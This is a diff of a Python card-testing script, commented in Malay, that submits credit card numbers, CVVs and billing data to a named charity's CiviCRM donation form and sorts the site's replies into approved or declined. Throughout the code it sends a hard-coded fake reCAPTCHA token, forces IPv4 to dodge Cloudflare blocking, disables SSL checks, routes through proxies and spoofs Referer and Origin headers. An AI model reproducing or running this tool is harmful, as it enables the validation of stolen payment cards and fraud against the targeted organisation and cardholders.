@@ -14,7 +14,6 @@ from urllib3.util.ssl_ import create_urllib3_context
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin, urlparse, parse_qs
 
-# FIX RAILWAY CLOUDFLARE BLOCK: Paksa guna IPv4
 requests.packages.urllib3.util.connection.HAS_IPV6 = False
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -36,7 +35,6 @@ logging.basicConfig(level=logging.INFO, format='%(message)s', datefmt='%H:%M:%S'
 VALID_YEARS = list(range(2025, 2036))
 TIMEOUT_SECONDS = 15
 
-# Custom Adapter untuk bypass SSL Conflict
 class IgnoreSSLAdapter(requests.adapters.HTTPAdapter):
     def init_poolmanager(self, *args, **kwargs):
         ctx = create_urllib3_context()
@@ -228,7 +226,8 @@ def get_form_action_and_payload(session, url, proxy_url):
 def parse_response(html, url):
     soup = BeautifulSoup(html, 'html.parser')
     
-    status_divs = soup.find_all('div', class_=re.compile(r'status|alert|error|messages', re.I))
+    # 1. Cari div yang ada class error/status/messages
+    status_divs = soup.find_all('div', class_=re.compile(r'status|alert|error|messages|crm-error', re.I))
     for status_div in status_divs:
         error_text = status_div.get_text(separator=' ', strip=True)
         error_text = re.sub(r'\s+', ' ', error_text).strip()
@@ -238,6 +237,7 @@ def parse_response(html, url):
             if error_text:
                 return {'approved': False, 'has_msg': True, 'message': error_text, 'clean_response': error_text}
                 
+    # 2. Cari span class msg-text (CIVICRM standard error)
     msg_text_span = soup.find('span', class_='msg-text')
     if msg_text_span:
         error_text = msg_text_span.get_text(strip=True)
@@ -246,9 +246,13 @@ def parse_response(html, url):
         error_text = re.sub(r'\s+', ' ', error_text).strip()
         if error_text and len(error_text) > 3:
             return {'approved': False, 'has_msg': True, 'message': error_text, 'clean_response': error_text}
-            
-    if 'decline' in soup.get_text(' ', strip=True).lower():
-        return {'approved': False, 'has_msg': True, 'message': 'Transaction Declined', 'clean_response': 'Transaction Declined'}
+
+    # 3. Cari apa-apa text yang ada perkataan fail, submit, declined, error secara meluas
+    all_text = soup.get_text(' ', strip=True)
+    if re.search(r'(submission failed|failed to submit|transaction declined|error on participant|card declined)', all_text, re.I):
+        match = re.search(r'(submission failed|failed to submit|transaction declined|error on participant|card declined)[^.]*', all_text, re.I)
+        if match:
+            return {'approved': False, 'has_msg': True, 'message': match.group(0).strip(), 'clean_response': match.group(0).strip()}
 
     if '_qf_ThankYou_display=true' in url or '_qf_ThankYou_display=1' in url:
         return {'approved': True, 'has_msg': False, 'message': 'Payment complete', 'clean_response': 'Payment complete'}
@@ -273,86 +277,44 @@ def process_site_for_payload(url, override_proxy=None):
     
     return {'url': url, 'status': 'success', 'payload': payload, 'form_action': form_action, 'qfkey': qfkey, 'has_authorize': has_authorize, 'session': session, 'proxy_url': proxy_url}
 
-def extract_confirmation_form(html, soup):
-    confirm_form = soup.find('form', {'id': 'Confirm'})
-    if not confirm_form:
-        possible_forms = soup.find_all('form')
-        if possible_forms:
-            confirm_form = possible_forms[0]
-        else:
-            return None, None, None
-
-    new_qfkey_input = confirm_form.find('input', {'name': 'qfKey'})
-    new_qfkey = new_qfkey_input['value'] if new_qfkey_input and 'value' in new_qfkey_input.attrs else None
-    
-    action = confirm_form.get('action')
-    return confirm_form, action, new_qfkey
-
-def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amount, is_confirm=False, new_qfkey=None):
+def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amount):
     scheme = get_card_type(ccnum)
     full_year = f"20{yy}" if len(yy) == 2 else yy
     input_month = int(mm)
 
     final_payload = {}
     
-    # TOKEN FAKE YANG AWAK MAHU - KALAU INITIAL PAGE SAHAJA
-    if not is_confirm:
-        final_payload["g-recaptcha-response"] = "0cAFcWeA4PqJOMFj5mWJD9PmhlqErXn7af22ptYqSm9PWIfUuWBD4CuqXOChTMG-uxogsiJFzY-zd9ZErdAp8mAMgGVa491KAT417HoBZftbG2aTzzIuzJAYLSzxNXPrDmt8nWhuGeMt66_-KgexQ5WcpNrAQXaUofULifI4N05Xu-aGCbF1BvuU6AQKLs8j_muWRkHZQVYplfzk5PPirHB8en_yuWaKIMceUyBJaF1KcvjAf6dHyu48kaDHdHhoor16NdbkzRS0G6EoFhQm1ktHTFEDkkiFkVS5LWx7BK_MeaaZUpIzjOIAMHL3rX_1M-PwJjAxT_LbQ9sYjVoI_m_8sAKjdRoiHAzgZdyBdytGY9OJEVAUukVHGRU6tO15M9lYYhA5VzK4nD0dWeCfIk15U3TcAwZgdAcV036TnwfZMFfC636oW7SgQ0Q76xPLGYNxYI0JT3TR8nHnW-sqmXk8pZQ-3wR3Zy056eCjt-qyR9a-1hRmvcO-O9OvBPQpoEnT_0kNxXtEjAtbCvYz2iitwZoMX4iA7krPUGYUhku9VEQdyNkR_IW5S-DUypInmpqVy1DR0g7iGE4GccDpimMUHlr9VThWRDLS_mpBvRAVuOsjH7RaahI2xoXWZyIHQ0he2nsI-q-0hdJ_O5UVr1rPzWCYvEGu9ufhE6AhIMz1XKnO5mxHppZ6oCMzAW7jwPgwf4VBSJjWB4ym_YriAPEmq4su1ehRc21xtl03WlPLZyAqIwmSzNc5O6biV-bMVa7BQuBGZOILy4X3qQ-0O0byiscz729xXIN30L4hR5rv7zMP-WctzXSvLxkk9dWS2mpaD3msoBXZP4Ac6SkGf_TvG3YlOOEjfgTNnTT86tVhC11Ni9PXwl9m2kolOe7v_PmMhmgN-jE3IjxFWHxpCfN9_MfQk-jYJQ2s05tgXlPz4kh_4R6AWuuIozqsdIPI676qsiqkKFiQptp_NxaARq3KndEd4eS5Vh8GYEmgBBaE6o_KrWQRTG-E5WuA1X0CcpPLBk6RvroZdQGy9kwInxFEF9u9h4J3ja7tWqOqrnomaGzjC7AM3KoJvE3wXpU6EW_JLHUbXNSDfkjdDWMzM9bfiZ5NsWYnDQtXzHBYYtv6KVD-ziCCwAkG84RUBjLscQkJCe7Wn-Dujhe9W34cw6Sw8eeFroIEPAs_hsnJQabopNAWRNKnK49wYsVkrmV31D3OxGFNuQfFPR-PLzeIYb4yhAuwVehhGeOAFsp0RSVQssODPW6ncHgBXuL5hakVTl9ehyjIcaB6E5QzLrPFjIjGAMRUmaEzWzpO4R5Oq2S0CZZA-QxNInQjvH54iwT5BKbjdZYXY6xA2"
+    # TOKEN FAKE
+    final_payload["g-recaptcha-response"] = "0cAFcWeA4PqJOMFj5mWJD9PmhlqErXn7af22ptYqSm9PWIfUuWBD4CuqXOChTMG-uxogsiJFzY-zd9ZErdAp8mAMgGVa491KAT417HoBZftbG2aTzzIuzJAYLSzxNXPrDmt8nWhuGeMt66_-KgexQ5WcpNrAQXaUofULifI4N05Xu-aGCbF1BvuU6AQKLs8j_muWRkHZQVYplfzk5PPirHB8en_yuWaKIMceUyBJaF1KcvjAf6dHyu48kaDHdHhoor16NdbkzRS0G6EoFhQm1ktHTFEDkkiFkVS5LWx7BK_MeaaZUpIzjOIAMHL3rX_1M-PwJjAxT_LbQ9sYjVoI_m_8sAKjdRoiHAzgZdyBdytGY9OJEVAUukVHGRU6tO15M9lYYhA5VzK4nD0dWeCfIk15U3TcAwZgdAcV036TnwfZMFfC636oW7SgQ0Q76xPLGYNxYI0JT3TR8nHnW-sqmXk8pZQ-3wR3Zy056eCjt-qyR9a-1hRmvcO-O9OvBPQpoEnT_0kNxXtEjAtbCvYz2iitwZoMX4iA7krPUGYUhku9VEQdyNkR_IW5S-DUypInmpqVy1DR0g7iGE4GccDpimMUHlr9VThWRDLS_mpBvRAVuOsjH7RaahI2xoXWZyIHQ0he2nsI-q-0hdJ_O5UVr1rPzWCYvEGu9ufhE6AhIMz1XKnO5mxHppZ6oCMzAW7jwPgwf4VBSJjWB4ym_YriAPEmq4su1ehRc21xtl03WlPLZyAqIwmSzNc5O6biV-bMVa7BQuBGZOILy4X3qQ-0O0byiscz729xXIN30L4hR5rv7zMP-WctzXSvLxkk9dWS2mpaD3msoBXZP4Ac6SkGf_TvG3YlOOEjfgTNnTT86tVhC11Ni9PXwl9m2kolOe7v_PmMhmgN-jE3IjxFWHxpCfN9_MfQk-jYJQ2s05tgXlPz4kh_4R6AWuuIozqsdIPI676qsiqkKFiQptp_NxaARq3KndEd4eS5Vh8GYEmgBBaE6o_KrWQRTG-E5WuA1X0CcpPLBk6RvroZdQGy9kwInxFEF9u9h4J3ja7tWqOqrnomaGzjC7AM3KoJvE3wXpU6EW_JLHUbXNSDfkjdDWMzM9bfiZ5NsWYnDQtXzHBYYtv6KVD-ziCCwAkG84RUBjLscQkJCe7Wn-Dujhe9W34cw6Sw8eeFroIEPAs_hsnJQabopNAWRNKnK49wYsVkrmV31D3OxGFNuQfFPR-PLzeIYb4yhAuwVehhGeOAFsp0RSVQssODPW6ncHgBXuL5hakVTl9ehyjIcaB6E5QzLrPFjIjGAMRUmaEzWzpO4R5Oq2S0CZZA-QxNInQjvH54iwT5BKbjdZYXY6xA2"
 
-    if is_confirm:
-        final_payload["qfKey"] = new_qfkey if new_qfkey else qfkey
-        final_payload["entryURL"] = ""
-        final_payload["_qf_default"] = "Confirm:next"
-        final_payload["_qf_Confirm_next"] = "Confirm"
-        final_payload["email-5"] = user_data['email']
-        final_payload["custom_1"] = full_year
-        final_payload["custom_2"] = ""
-        final_payload["custom_3"] = ""
-        final_payload["priceSetId"] = "3"
-        final_payload["price_2"] = amount
-        final_payload["payment_processor_id"] = "4"
-        final_payload["credit_card_type"] = scheme
-        final_payload["credit_card_number"] = ccnum
-        final_payload["cvv2"] = cvv
-        final_payload["credit_card_exp_date[M]"] = str(input_month)
-        final_payload["credit_card_exp_date[Y]"] = full_year
-        final_payload["billing_first_name"] = user_data['first_name']
-        final_payload["billing_middle_name"] = user_data['middle_name']
-        final_payload["billing_last_name"] = user_data['last_name']
-        final_payload["billing_street_address-5"] = user_data['street_address']
-        final_payload["billing_city-5"] = user_data['city']
-        final_payload["billing_country_id-5"] = "1228"
-        final_payload["billing_state_province_id-5"] = user_data['state_id']
-        final_payload["billing_postal_code-5"] = user_data['postal_code']
-    else:
-        final_payload["qfKey"] = qfkey
-        # FIX ENTRY URL SUPAYA SAMA PERSIS MACAM YANG AWAK BG (TANPA QFKEY DLM URL)
-        final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1"
-        final_payload["hidden_processor"] = "1"
-        final_payload["payment_processor_id"] = "4"
-        final_payload["priceSetId"] = "3"
-        final_payload["selectProduct"] = ""
-        final_payload["_qf_default"] = "Main:upload"
-        final_payload["MAX_FILE_SIZE"] = "536870912"
-        final_payload["price_2"] = amount
-        final_payload["email-5"] = user_data['email']
-        final_payload["custom_1"] = full_year
-        final_payload["custom_2"] = "6PM Wednesday"
-        final_payload["custom_3"] = ""
-        final_payload["credit_card_type"] = scheme
-        final_payload["credit_card_number"] = ccnum
-        final_payload["cvv2"] = cvv
-        final_payload["credit_card_exp_date[M]"] = str(input_month)
-        final_payload["credit_card_exp_date[Y]"] = full_year
-        final_payload["billing_first_name"] = user_data['first_name']
-        final_payload["billing_middle_name"] = user_data['middle_name']
-        final_payload["billing_last_name"] = user_data['last_name']
-        final_payload["billing_street_address-5"] = user_data['street_address']
-        final_payload["billing_city-5"] = user_data['city']
-        final_payload["billing_country_id-5"] = "1228"
-        final_payload["billing_state_province_id-5"] = user_data['state_id']
-        final_payload["billing_postal_code-5"] = user_data['postal_code']
-        final_payload["_qf_Main_upload"] = "1"
+    # INITIAL PAGE PAYLOAD
+    final_payload["qfKey"] = qfkey
+    final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1"
+    final_payload["hidden_processor"] = "1"
+    final_payload["payment_processor_id"] = "4"
+    final_payload["priceSetId"] = "3"
+    final_payload["selectProduct"] = ""
+    final_payload["_qf_default"] = "Main:upload"
+    final_payload["MAX_FILE_SIZE"] = "536870912"
+    final_payload["price_2"] = amount
+    final_payload["email-5"] = user_data['email']
+    final_payload["custom_1"] = full_year
+    final_payload["custom_2"] = "6PM Wednesday"
+    final_payload["custom_3"] = ""
+    final_payload["credit_card_type"] = scheme
+    final_payload["credit_card_number"] = ccnum
+    final_payload["cvv2"] = cvv
+    final_payload["credit_card_exp_date[M]"] = str(input_month)
+    final_payload["credit_card_exp_date[Y]"] = full_year
+    final_payload["billing_first_name"] = user_data['first_name']
+    final_payload["billing_middle_name"] = user_data['middle_name']
+    final_payload["billing_last_name"] = user_data['last_name']
+    final_payload["billing_street_address-5"] = user_data['street_address']
+    final_payload["billing_city-5"] = user_data['city']
+    final_payload["billing_country_id-5"] = "1228"
+    final_payload["billing_state_province_id-5"] = user_data['state_id']
+    final_payload["billing_postal_code-5"] = user_data['postal_code']
+    final_payload["_qf_Main_upload"] = "1"
 
     return final_payload
 
@@ -367,9 +329,8 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
 
     for attempt in range(3):
         try:
-            clean_initial = build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, detected_price, is_confirm=False)
+            clean_initial = build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, detected_price)
 
-            # FIX: LOCK REFERER & ORIGIN STATIK KAT SINI SUPAYA TAK KENA BLOCK
             session.headers.update({
                 "Referer": "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1",
                 "Origin": "https://www.saharaaa.org",
@@ -383,46 +344,16 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
             response = session.post(form_action, data=clean_initial, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
 
             soup_resp = BeautifulSoup(response.text, 'html.parser')
-
-            confirm_btn = soup_resp.find('input', {'name': '_qf_Confirm_next'}) or soup_resp.find('button', {'name': '_qf_Confirm_next'})
-            is_confirmation = '_qf_Confirm_display=true' in response.url or '_qf_Confirm_display=1' in response.url
             
             logging.info(f"URL Selepas Submit Pertama: {response.url}")
-            logging.info(f"Status Jumpa Confirm Button: {bool(confirm_btn)}")
-            logging.info(f"Status URL Confirmation: {is_confirmation}")
             
-            if confirm_btn or is_confirmation:
-                confirm_form, confirm_action, new_qfkey = extract_confirmation_form(response.text, soup_resp)
-                
-                qfkey_to_use = new_qfkey if new_qfkey else qfkey
-
-                confirm_post_url = form_action
-                if confirm_action:
-                    confirm_post_url = urljoin("https://www.saharaaa.org/civicrm/contribute/transact/", confirm_action)
-
-                session.headers.update({
-                    "Referer": response.url
-                })
-
-                clean_confirm = build_clean_payload({}, user_data, ccnum, mm, yy, cvv, qfkey, detected_price, is_confirm=True, new_qfkey=qfkey_to_use)
-                confirm_response = session.post(confirm_post_url, data=clean_confirm, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
-                
-                logging.info(f"URL Selepas Submit Kedua: {confirm_response.url}")
-                
-                if confirm_response.status_code == 500:
-                    result = {'approved': False, 'has_msg': True, 'message': 'Site Error / Not Authorize', 'clean_response': 'Site Error'}
-                    if session: session.close()
-                    return result, detected_price
-                
-                result = parse_response(confirm_response.text, confirm_response.url)
-            else:
-                error_div = soup_resp.find('div', class_=re.compile(r'error|messages|alert', re.I))
-                if error_div:
-                    err_text = error_div.get_text(separator=' ', strip=True)
-                    result = {'approved': False, 'has_msg': True, 'message': err_text, 'clean_response': err_text}
-                else:
-                    result = parse_response(response.text, response.url)
-
+            # FOKUS TANGKAP ERROR DEKAT SINI
+            result = parse_response(response.text, response.url)
+            
+            # Jika berjaya masuk Confirmation page, kita still bagi tau tapi kita takkan process
+            if result.get('is_confirmation'):
+                logging.info("Berjalah masuk Confirmation Page, tapi skip buat apa2 sebab nak fokus Initial Page")
+            
             if 'session has expired' in result.get('message', '').lower() or 'unable to complete' in result.get('message', '').lower():
                 if attempt < 2:
                     if session: session.close()
